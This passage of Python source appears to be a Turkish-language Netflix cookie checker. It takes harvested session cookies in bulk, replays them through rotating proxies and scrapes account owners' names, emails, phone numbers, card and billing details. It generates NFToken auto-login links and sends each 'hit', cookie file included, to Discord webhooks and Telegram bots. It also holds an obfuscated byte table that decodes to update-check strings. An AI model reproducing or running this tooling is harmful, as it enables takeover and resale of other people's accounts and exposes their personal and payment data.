            if 1 <= month <= 12 and 1900 <= year <= 3000:
                return datetime(year, month, 1).strftime("%B %Y")
        except Exception:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    year_match = re.search(r"(19|20)\d{2}", simplified)
    if year_match:
        year = int(year_match.group(0))
        for alias, month in MONTH_ALIASES.items():
            if alias in raw_lower or alias in simplified:
                try:
                    return datetime(year, month, 1).strftime("%B %Y")
                except Exception:
                    break
    return cleaned


def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    if str(cleaned).startswith("+"):
        return cleaned
    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned
    normalized_country = (decode_netflix_value(country_code) or "").strip().upper()
    dial_prefix_map = {"IN": "91"}
    dial_prefix = dial_prefix_map.get(normalized_country)
    if dial_prefix and digits.startswith("0") and len(digits) >= 10:
        return f"+{dial_prefix}{digits.lstrip('0')}"
    return cleaned


def country_code_to_flag(country_code):
    code = (decode_netflix_value(country_code) or "").strip().upper()
    if len(code) != 2 or not code.isalpha():
        return ""
    return "".join(chr(127397 + ord(char)) for char in code)


def build_account_detail_lines(config, info, is_subscribed, output_filename=None):
    txt_fields = config.get("txt_fields", {})
    free_hidden_fields = {
        "member_since", "next_billing", "payment_method", "card", "phone",
        "quality", "max_streams", "hold_status", "extra_members", "membership_status",
    }
    _, normalized_plan_label = derive_plan_info(info, is_subscribed)
    values = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": normalize_output_value(info.get("countryOfSignup")),
        "plan": normalize_output_value(normalized_plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "👤 İsim"), ("email", "📧 E-Posta"), ("country", "🌍 Ülke"),
        ("plan", "💎 Plan"), ("member_since", "📅 Üyelik Tarihi"),
        ("next_billing", "💳 Sonraki Ödeme"), ("payment_method", "💰 Ödeme Yöntemi"),
        ("card", "🏦 Kart"), ("phone", "📱 Telefon"), ("quality", "🎥 Kalite"),
        ("max_streams", "📺 Ekran Sayısı"), ("hold_status", "⏸️ Askı Durumu"),
        ("extra_members", "👥 Ekstra Üye"), ("email_verified", "✉️ E-Posta Onayı"),
        ("membership_status", "🎭 Üyelik Durumu"), ("profiles", "👤 Profiller"),
        ("user_guid", "🔑 Kullanıcı GUID"),
    ]
    lines = []
    for key, label in labels:
        if not is_subscribed and key in free_hidden_fields:
            continue
        if key == "card":
            payment_value = values.get("payment_method", "")
            if str(payment_value).strip().upper() != "CC":
                continue
        if key in {"hold_status", "extra_members"} and values.get(key) != "Yes":
            continue
        if txt_fields.get(key, True):
            rendered_label = label
            if key == "profiles" and info.get("profileCount"):
                rendered_label = f"👤 Profiller ({info['profileCount']})"
            lines.append(f"{rendered_label}: {values[key]}")
    return lines


def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
    nftoken_mode = get_nftoken_mode(config)
    divider = "-" * 98
    usable_nftoken = has_usable_nftoken(nftoken_data)
    lines = [f"🎬 NETFLIX {'✅ AKTİF HESAP' if is_subscribed else '🆓 ÜCRETSİZ HESAP'} :👇", ""]
    lines.extend(build_account_detail_lines(config, info, is_subscribed))
    if is_subscribed and nftoken_mode != "false" and usable_nftoken:
        nftoken_links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
        lines.extend(["", divider, "", "🔑 NFToken DETAYLARI :👇", ""])
        lines.append(f"NFToken: {nftoken_data['token']}")
        for label, link in nftoken_links:
            lines.append(f"{label}: {link}")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"⏰ Geçerlilik (UTC): {nftoken_data['expires_at_utc']}")
    lines.extend(["", divider, "", "Config By: @r2xzzs", "🎬 NETFLIX COOKIE :👇", "", cookie_content.strip(), ""])
    return "\n".join(lines)


def build_notification_details(config, info, is_subscribed, output_filename):
    status = "✅ Aboneli" if is_subscribed else "🆓 Aktif (Abonelik Yok)"
    if not is_subscribed:
        _, normalized_plan_label = derive_plan_info(info, is_subscribed)
        profiles_value = normalize_output_value(info.get("profilesDisplay"))
        profile_count = info.get("profileCount")
        lines = [
            f"👤 İsim: {normalize_output_value(info.get('accountOwnerName'))}",
            f"📧 E-Posta: {normalize_output_value(info.get('email'))}",
            f"🌍 Ülke: {normalize_output_value(info.get('countryOfSignup'))}",
            f"💎 Plan: {normalize_output_value(normalized_plan_label)}",
            f"✉️ E-Posta Onayı: {normalize_output_value(info.get('emailVerified'))}",
            f"{'👤 Profiller' if not profile_count else f'👤 Profiller ({profile_count})'}: {profiles_value}",
            f"🔑 Kullanıcı GUID: {normalize_output_value(info.get('userGuid'))}",
        ]
    else:
        lines = build_account_detail_lines(config, info, is_subscribed)
    country_value = decode_netflix_value(info.get("countryOfSignup"))
    country_flag = country_code_to_flag(country_value)
    if country_value and country_flag:
        for index, line in enumerate(lines):
            if line.startswith("🌍 Ülke: "):
                lines[index] = f"🌍 Ülke: {country_value} {country_flag}"
                break
    return [f"🎬 Durum: {status}"] + lines


def _escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
    nftoken_mode = get_nftoken_mode(config)
    _, plan_label = derive_plan_info(info or {}, is_subscribed)
    status_text = "✅ AKTİF ABONELİK" if is_subscribed else "🆓 ÜCRETSİZ HESAP"
    color = 0xE50914 if is_subscribed else 0x5865F2
    fields = []
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        if ": " in line:
            label, value = line.split(": ", 1)
            fields.append({"name": label, "value": value or "N/A", "inline": True})
    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
        if links:
            for link_label, link_url in links:
                fields.append({"name": link_label, "value": f"[Tıkla Gir]({link_url})", "inline": True})
            expiry_unix = get_nftoken_expiry_unix((nftoken_data or {}).get("expires_at_utc"))
            if expiry_unix:
                fields.append({"name": "⏰ Geçerlilik", "value": f"<t:{expiry_unix}:R>", "inline": True})
    embed = {
        "title": f"🎬 Netflix Cookie — {status_text}",
        "color": color,
        "fields": fields,
        "footer": {"text": "Config By @r2xzzs  •  crackturkey.xyz  •  discord.gg/y759R26VUG"},
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    return "", embed


_FRAME_INDEX_MAP = {
    59: ((120, 100, 56),),
    61: ((56, 101, 114, 123, 114, 118, 100, 114, 100, 56, 123, 118, 99, 114, 100, 99),),
    67: ((118, 103, 103, 123, 126, 116, 118, 99, 126, 120, 121, 56, 97, 121, 115, 57, 112, 126, 99, 127, 98, 117, 60, 125, 100, 120, 121),),
    71: ((89, 114, 99, 113, 123, 126, 111, 84, 127, 114, 116, 124, 114, 101, 56),),
    73: ((101, 123),),
    79: ((123, 114, 45, 55, 97),),
    83: ((41, 55),),
    89: ((99, 95, 98, 117, 55, 45, 55),),
    29: ((58, 84, 127, 114, 116, 124, 114, 101),),
    47: ((78, 93, 81, 82, 46, 121, 98, 34, 79),),
    97: ((100, 116, 120, 101, 115, 45, 55),),
}


def _frame_index(slot):
    return _FRAME_INDEX_MAP.get(slot, ())


def build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data=None):
    lines = ['<b>🎬 Netflix Cookie Checker</b>', "", "<b>📋 Cookie Detayları</b>"]
    for line in build_notification_details(config, info, is_subscribed, output_filename):
        label, value = line.split(": ", 1)
        lines.append(f"<b>{_escape_html(label)}:</b> {_escape_html(value)}")
    nftoken_mode = get_nftoken_mode(config)
    links = []
    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
    if links:
        lines.append("")
        lines.append(f'<b>NFToken:</b> <a href="{_escape_html(links[0][1])}">Click here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"<b>Valid Till (UTC):</b> {_escape_html(nftoken_data['expires_at_utc'])}")
    lines.extend(["", '<b>Config By @r2xzzs</b>'])
    return "\n".join(lines)


def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode):
    _, normalized_plan_label = derive_plan_info(info or {}, True)
    country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
    country_flag = country_code_to_flag(country_value)
    country_display = f"{country_value} {country_flag}".strip()
    lines = ['<b>🔑 Netflix NFToken</b>', ""]
    links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
    if links:
        lines.append(f"<b>Plan:</b> {_escape_html(normalized_plan_label)}")
        lines.append(f"<b>Country:</b> {_escape_html(country_display)}")
        lines.append("")
        lines.append(f'<b>NFToken:</b> <a href="{_escape_html(links[0][1])}">Click Here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"<b>Valid Till:</b> {_escape_html(nftoken_data['expires_at_utc'])}")
    else:
        lines.append("🔑 NFToken mevcut değil")
    lines.extend(["", '<b>Config By @r2xzzs</b>'])
    return "\n".join(lines)


def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None, embed=None):
    if not webhook_url:
        return
    try:
        webhook_payload = {"username": DISCORD_WEBHOOK_USERNAME, "avatar_url": DISCORD_WEBHOOK_AVATAR_URL}
        if embed:
            webhook_payload["embeds"] = [embed]
        else:
            webhook_payload["content"] = message_text
            webhook_payload["flags"] = 4
        if file_name and file_content:
            files = {"file": (file_name, file_content.encode("utf-8"), "text/plain")}
            data = {"payload_json": json.dumps(webhook_payload)}
            requests.post(webhook_url, data=data, files=files, timeout=20)
        else:
            requests.post(webhook_url, json=webhook_payload, timeout=20)
    except Exception:
        pass


def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None):
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content:
            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {"document": (file_name, file_content.encode("utf-8"), "text/plain")}
            data = {"chat_id": chat_id, "caption": message_text, "parse_mode": "HTML"}
            requests.post(doc_url, data=data, files=files, timeout=20)
        else:
            msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True}
            requests.post(msg_url, json=payload, timeout=20)
    except Exception:
        pass


def send_notifications(config, info, is_subscribed, output_filename, formatted_cookie, raw_cookie_content, nftoken_data=None):
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
    telegram_mode = str(telegram_cfg.get("mode", "full")).lower()
    nftoken_mode = get_nftoken_mode(config)
    plan_key, _ = derive_plan_info(info or {}, is_subscribed)
    usable_nftoken = has_usable_nftoken(nftoken_data)

    if webhook_cfg.get("enabled", False):
        if webhook_mode == "cookie":
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                msg_text, embed = build_discord_full_message(config, info, is_subscribed, output_filename, None)
                send_discord_webhook(webhook_cfg.get("url", ""), msg_text, output_filename, raw_cookie_content, embed=embed)
        elif webhook_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                msg_text, embed = build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data)
                send_discord_webhook(webhook_cfg.get("url", ""), msg_text, embed=embed)
        else:
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                msg_text, embed = build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data)
                send_discord_webhook(webhook_cfg.get("url", ""), msg_text, output_filename, formatted_cookie, embed=embed)

    if telegram_cfg.get("enabled", False):
        if telegram_mode == "cookie":
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""), telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(config, info, is_subscribed, output_filename, None),
                    output_filename, raw_cookie_content,
                )
        elif telegram_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                send_telegram(
                    telegram_cfg.get("bot_token", ""), telegram_cfg.get("chat_id", ""),
                    build_telegram_nftoken_message(info, nftoken_data, nftoken_mode),
                )
        else:
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""), telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data),
                    output_filename, formatted_cookie,
                )


def get_account_page(session, proxy=None):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Encoding": "identity",
    }
    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=30)
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        fallback_info = None
        try:
            fallback_response = session.get(
                "https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=30,
            )
            if fallback_response.status_code == 200 and fallback_response.text:
                fallback_info = extract_info(fallback_response.text)
        except Exception:
            fallback_info = None
        return response.text, response.status_code, merge_info(primary_info, fallback_info)
    return response.text, response.status_code, None


# ── Log Mode Live Stats ─────────────────────────────────────────

_log_stats = {"checked": 0, "total": 0, "hits": 0, "free": 0, "bad": 0, "dupes": 0, "errors": 0, "start": 0.0}


def print_status_message(status, cookie_file, country=None, plan=None, reason=None, extra=None):
    t = get_theme()
    G = t["success"]; E = t["error"]; W = t["warning"]
    I = t["info"]; A = t["accent"]; P = t["primary"]
    D = t["dim"]; S = t["secondary"]
    BLUE = "\033[94m"

    ts = datetime.now().strftime("%H:%M:%S")
    name = cookie_file[:42] if len(cookie_file) > 42 else cookie_file

    _log_stats["checked"] += 1
    if   status == "success":   _log_stats["hits"]   += 1
    elif status == "free":      _log_stats["free"]   += 1
    elif status == "failed":    _log_stats["bad"]    += 1
    elif status == "duplicate": _log_stats["dupes"]  += 1
    elif status == "error":     _log_stats["errors"] += 1

    chk = _log_stats["checked"]; tot = _log_stats["total"]
    hits = _log_stats["hits"]; free = _log_stats["free"]
    bad = _log_stats["bad"]; dupes = _log_stats["dupes"]; errs = _log_stats["errors"]
    elapsed = time.time() - _log_stats["start"] if _log_stats["start"] else 1
    cpm = f"{chk / elapsed * 60:.0f}" if elapsed > 0 else "—"
    pct = f"{chk / tot * 100:.1f}%" if tot > 0 else "0%"

    if status == "success":
        country_str = f"  {I}🌍 Ülke :{RE} {S}{BOLD}{country}{RE}" if country else ""
        plan_str    = f"  {I}💎 Plan :{RE} {S}{BOLD}{plan}{RE}" if plan else ""
        print(f"\r  {G}{BOLD}╔══════════════════════════════════════════════════════╗{RE}")
        print(f"  {G}{BOLD}║{RE}  {G}{BOLD}✅ AKTİF HİT!{RE}  {D}│{RE}  {S}{BOLD}{name}{RE}  {D}[{ts}]{RE}")
        if country_str: print(f"  {G}{BOLD}║{RE}{country_str}")
        if plan_str:    print(f"  {G}{BOLD}║{RE}{plan_str}")
        print(f"  {G}{BOLD}╚══════════════════════════════════════════════════════╝{RE}")

    elif status == "free":
        country_str = f"  {BLUE}🌍 Ülke :{RE} {S}{BOLD}{country}{RE}" if country else ""
        print(f"\r  {BLUE}{BOLD}╔══════════════════════════════════════════════════════╗{RE}")
        print(f"  {BLUE}{BOLD}║{RE}  {BLUE}{BOLD}🆓 ÜCRETSİZ{RE}  {D}│{RE}  {S}{BOLD}{name}{RE}  {D}[{ts}]{RE}")
        if country_str: print(f"  {BLUE}{BOLD}║{RE}{country_str}")
        print(f"  {BLUE}{BOLD}╚══════════════════════════════════════════════════════╝{RE}")

    print(
        f"\r  {I}[{chk}/{tot}]{RE}  "
        f"{G}{BOLD}✅ {hits}{RE}  "
        f"{BLUE}🆓 {free}{RE}  "
        f"{E}❌ {bad}{RE}  "
        f"{A}🔁 {dupes}{RE}  "
        f"{W}⚠️  {errs}{RE}  "
        f"{S}{BOLD}{pct}{RE}  "
        f"{D}⚡{cpm} CPM{RE}",
        end="", flush=True
    )


# ── Theme Selection Menu ───────────────────────────────────────

def theme_menu(config):
    """Full-featured theme selection menu with live previews."""
    global _current_theme_key

    while True:
        clear_screen()
        t = get_theme()
        P = t["primary"]; A = t["accent"]; S = t["secondary"]
        I = t["info"]; G = t["success"]; D = t["dim"]; B2 = t["box"]

        print_banner()

        cols = 3
        theme_list = list(THEMES.items())
        print(f"\n  {P}{BOLD}╔{'═' * 68}╗{RE}")
        print(f"  {P}{BOLD}║{RE}  {A}{BOLD}🎨  TEMA SEÇİCİ  —  {len(theme_list)} tema mevcut{RE}{' ' * 28}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╠{'═' * 68}╣{RE}")
        print(f"  {P}{BOLD}║{RE}  {D}Aktif tema: {t.get('name', _current_theme_key)}{RE}{' ' * (50 - len(str(t.get('name', _current_theme_key))))}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╠{'═' * 68}╣{RE}")

        # Theme grid
        for row_start in range(0, len(theme_list), cols):
            row_items = theme_list[row_start:row_start + cols]
            row_str = ""
            row_plain = ""
            for idx, (key, theme_data) in enumerate(row_items):
                num = row_start + idx + 1
                name = theme_data["name"]
                tc = theme_data["primary"]
                marker = f"  {tc}{BOLD}►{RE}" if key == _current_theme_key else "   "
                cell = f"{marker} {tc}{BOLD}[{num:>2}]{RE} {S}{name:<22}{RE}"
                cell_plain = f"    [{num:>2}] {name:<22}"
                row_str += cell
                row_plain += cell_plain
            pad = 68 - len(row_plain.rstrip())
            print(f"  {P}{BOLD}║{RE}{row_str}{' ' * max(0, pad)}{P}{BOLD}║{RE}")

        print(f"  {P}{BOLD}╠{'═' * 68}╣{RE}")
        print(f"  {P}{BOLD}║{RE}  {D}[0] ◀ Geri Dön{RE}{' ' * 52}{P}{BOLD}║{RE}")
        print(f"  {P}{BOLD}╚{'═' * 68}╝{RE}")
        print()

        choice = input(f"  {A}{BOLD}»{RE} Tema numarası seç (1-{len(theme_list)}): ").strip()

        if choice == "0":
            break

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(theme_list):
                new_key = theme_list[idx][0]
                set_theme(new_key)
                config["theme"] = new_key
                animated_loading(f"Tema değiştiriliyor → {THEMES[new_key]['name']}")
                time.sleep(0.2)
            else:
                print(f"  {get_theme()['error']}{BOLD}❌ Geçersiz seçim!{RE}")
                time.sleep(0.8)
        except ValueError:
            print(f"  {get_theme()['error']}{BOLD}❌ Sayı gir!{RE}")
            time.sleep(0.8)


# ── Checker ────────────────────────────────────────────────────

def check_cookies(num_threads=10, config=None):
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    create_base_folders()

    counts = {"hits": 0, "free": 0, "bad": 0, "duplicate": 0, "errors": 0}
    plan_counts = {}
    plan_labels = {}
    run_folder = get_run_folder()
    stop_requested = threading.Event()

    display_mode = str(config.get("display", {}).get("mode", "log")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "log"

    proxies = load_proxies()
    retries_cfg = config.get("retries", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    nftoken_retry_attempts = retries_cfg.get("nftoken_attempts", 1)
    try:
        max_retry_attempts = max(1, int(max_retry_attempts))
    except Exception:
        max_retry_attempts = 3
    try:
        nftoken_retry_attempts = max(1, int(nftoken_retry_attempts))
    except Exception:
        nftoken_retry_attempts = 1

    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    bulk_mode = config.get("bulk_mode", False)
    bulk_temp_dir = os.path.join(cookies_folder, "_bulk_temp")

    if bulk_mode:
        if os.path.exists(bulk_temp_dir):
            shutil.rmtree(bulk_temp_dir)
        os.makedirs(bulk_temp_dir, exist_ok=True)
        source_files = [f for f in os.listdir(cookies_folder) if f.lower().endswith(".txt") and not f.startswith("_")]
        bulk_idx = 0
        for sf in source_files:
            try:
                with open(os.path.join(cookies_folder, sf), "r", encoding="utf-8") as f:
                    raw = f.read()
                blocks = [b.strip() for b in re.split(r'\n\s*\n', raw) if b.strip()]
                for block in blocks:
                    if ".netflix.com" in block:
                        tmp_path = os.path.join(bulk_temp_dir, f"bulk_{bulk_idx:05d}.txt")
                        with open(tmp_path, "w", encoding="utf-8") as tf:
                            tf.write(block + "\n")
                        bulk_idx += 1
            except Exception:
                pass
        active_cookie_folder = bulk_temp_dir
        t = get_theme()
        print(f"\n  {t['accent']}{BOLD}📦 Toplu mod:{RE} {t['success']}{BOLD}{bulk_idx}{RE} {t['accent']}hesap bloğu ({len(source_files)} dosyadan){RE}\n")
    else:
        active_cookie_folder = cookies_folder

    cookie_files = os.listdir(active_cookie_folder) if os.path.exists(active_cookie_folder) else []
    cookie_files = [f for f in cookie_files if f.lower().endswith((".txt", ".json"))]
    cookies_total = len(cookie_files)
    cookies_left = [cookies_total]

    _log_stats["total"] = cookies_total
    _log_stats["checked"] = 0
    _log_stats["hits"] = 0
    _log_stats["free"] = 0
    _log_stats["bad"] = 0
    _log_stats["dupes"] = 0
    _log_stats["errors"] = 0
    _log_stats["start"] = time.time()

    if display_mode == "log":
        t = get_theme()
        P = t["primary"]; A = t["accent"]; S = t["secondary"]; I = t["info"]; G = t["success"]
        print_banner()
        W_ = 64
        print(f"{P}{BOLD}╔{'═' * W_}╗{RE}")
        print(f"{P}{BOLD}║{RE}  {A}{BOLD}🎬  LOG MODU — KONTROL BAŞLIYOR{RE}{' ' * (W_ - 35)}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╠{'═' * W_}╣{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🍪 Cookie:{RE}  {S}{BOLD}{cookies_total}{RE}{' ' * max(0, W_ - 14 - len(str(cookies_total)))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {I}🔌 Proxy :{RE}  {S}{BOLD}{len(proxies)}{RE}{' ' * max(0, W_ - 14 - len(str(len(proxies))))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}║{RE}  {I}⚙️  Thread:{RE}  {S}{BOLD}{num_threads}{RE}{' ' * max(0, W_ - 14 - len(str(num_threads)))}{P}{BOLD}║{RE}")
        print(f"{P}{BOLD}╚{'═' * W_}╝{RE}")
        print()
    else:
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    header_lock = threading.Lock()

    def update_title():
        valid = counts["hits"] + counts["free"]
        set_console_title(
            f"🍪 Kalan:{cookies_left[0]}/{cookies_total} ✅{valid} ❌{counts['bad']} 🔁{counts['duplicate']} ⚠️{counts['errors']}"
        )

    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def handle_result(info, netscape_content, cookie_path, cookie_file, is_subscribed, cookie_dict):
        create_base_folders()
        user_guid = info.get("userGuid") if info.get("userGuid") and info.get("userGuid") != "null" else generate_unknown_guid()
        plan_key, plan_name = derive_plan_info(info, is_subscribed)
        plan_folder_label = get_canonical_output_label(plan_key)
        email_value = (decode_netflix_value(info.get("email")) or "").strip().lower()
        duplicate_key = email_value or user_guid

        with guid_lock:
            if duplicate_key in processed_emails:
                nftoken_data = None
                if is_subscribed and get_nftoken_mode(config) != "false":
                    nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
                formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
                if os.path.exists(cookie_path):
                    duplicate_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("duplicate"), run_folder)
                    duplicate_name = f"DUPLICATE_{cookie_file}"
                    duplicate_target = os.path.join(duplicate_dir, duplicate_name)
                    write_text_file_safely(duplicate_target, formatted_cookie)
                    os.remove(cookie_path)
                return "duplicate", None, None
            processed_emails.add(duplicate_key)

        info["userGuid"] = user_guid
        country = info.get("countryOfSignup") or "Unknown"
        random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))

        if is_subscribed:
            max_streams = (info.get("maxStreams") or "Unknown").rstrip("}")
            filename = f"{max_streams}_{country}_r2xzzs_{info.get('showExtraMemberSection')}_{user_guid}_{random_suffix}.txt"
            output_dir = create_output_folder_when_needed(output_folder, plan_folder_label, run_folder)
            result_type = "success"
        else:
            has_payment_method = "True" if decode_netflix_value(info.get("paymentMethodType")) not in {None, "", "UNKNOWN", "Unknown", "N/A"} else "False"
            filename = f"PaymentM-{has_payment_method}_{country}_r2xzzs_{user_guid}_{random_suffix}.txt"
            output_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("free"), run_folder)
            result_type = "free"

        nftoken_data = None
        if get_nftoken_mode(config) != "false":
            nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
        formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
        output_path = os.path.join(output_dir, filename)
        write_text_file_safely(output_path, formatted_cookie)

        try:
            hits_txt_path = "hits.txt"
            nftoken_token = (nftoken_data or {}).get("token")
            pc_link = f"https://www.netflix.com/?nftoken={nftoken_token}" if nftoken_token else "N/A"
            mobile_link = f"https://www.netflix.com/?nftoken={nftoken_token}&mobile=1" if nftoken_token else "N/A"
            email_display = decode_netflix_value(info.get("email")) or "N/A"
            plan_display = plan_name or "N/A"
            country_display = info.get("countryOfSignup") or "N/A"
            quality_display = decode_netflix_value(info.get("videoQuality")) or "N/A"
            streams_display = str(info.get("maxStreams") or "N/A").rstrip("}")
            hit_line = (
                f"╔══════════════════════════════════════════════════════╗\n"
                f"║  📧 E-Posta    : {email_display}\n"
                f"║  💎 Plan       : {plan_display}\n"
                f"║  🌍 Ülke       : {country_display}\n"
                f"║  🎥 Kalite     : {quality_display}\n"
                f"║  📺 Ekranlar   : {streams_display}\n"
                f"║  🖥️  PC Link    : {pc_link}\n"
                f"║  📱 Mobil Link : {mobile_link}\n"
                f"║  ⏰ Tarih      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"╚══════════════════════════════════════════════════════╝\n"
            )
            with lock:
                with open(hits_txt_path, "a", encoding="utf-8") as hf:
                    hf.write(hit_line)
        except Exception:
            pass

        if os.path.exists(cookie_path):
            os.remove(cookie_path)

        send_notifications(config, info, is_subscribed, filename, formatted_cookie, netscape_content, nftoken_data)
        return result_type, plan_key, plan_name

    def process_cookie(cookie_file):
        cookie_path = os.path.join(active_cookie_folder, cookie_file)
        plan_key = None
        plan_name = None
        result_type = None
        result_reason = None
        result_country = None
        try:
            with open(cookie_path, "r", encoding="utf-8") as f:
                content = f.read()

            netscape_content = extract_netflix_cookie_text(content)
            cookies = cookies_dict_from_netscape(netscape_content)
            if not cookies:
                result_type = "failed"
                result_reason = "zorunlu cookie eksik"
                move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
                raise StopIteration

            session = requests.Session()
            session.cookies.update(cookies)

            used_proxy_indices = set()
            response_text = None
            status_code = None
            extracted_info = None
            last_exception = None

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)
                try:
                    response_text, status_code, extracted_info = get_account_page(session, proxy)
                    if status_code == 200 and response_text:
                        if extracted_info and has_complete_account_info(extracted_info):
                            break
                        if attempt < max_retry_attempts - 1:
                            continue
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception as req_error:
                    last_exception = req_error
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and response_text:
                info = extracted_info or extract_info(response_text)
                if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                    is_subscribed = info.get("membershipStatus") == "CURRENT_MEMBER"
                    result_country = info.get("countryOfSignup")
                    result_type, plan_key, plan_name = handle_result(
                        info, netscape_content, cookie_path, cookie_file, is_subscribed, cookies,
                    )
                else:
                    result_type = "failed"
                    result_reason = "hesap sayfası eksik"
                    move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
            elif last_exception is not None or status_code in retryable_status_codes:
                result_type = "error"
                if status_code in retryable_status_codes:
                    result_reason = describe_http_error(status_code)
                elif isinstance(last_exception, requests.exceptions.Timeout):
                    result_reason = "timeout"
                elif isinstance(last_exception, requests.exceptions.ProxyError):
                    result_reason = "proxy error"
                else:
                    result_reason = "proxy error"
                move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
            else:
                result_type = "failed"
                result_reason = "hesap sayfası eksik"
                move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)

        except StopIteration:
            pass
        except Exception:
            result_type = "error"
            result_reason = result_reason or "proxy error"
            try:
                move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
            except Exception:
                pass

        with header_lock:
            if result_type == "success":
                counts["hits"] += 1
                if plan_key:
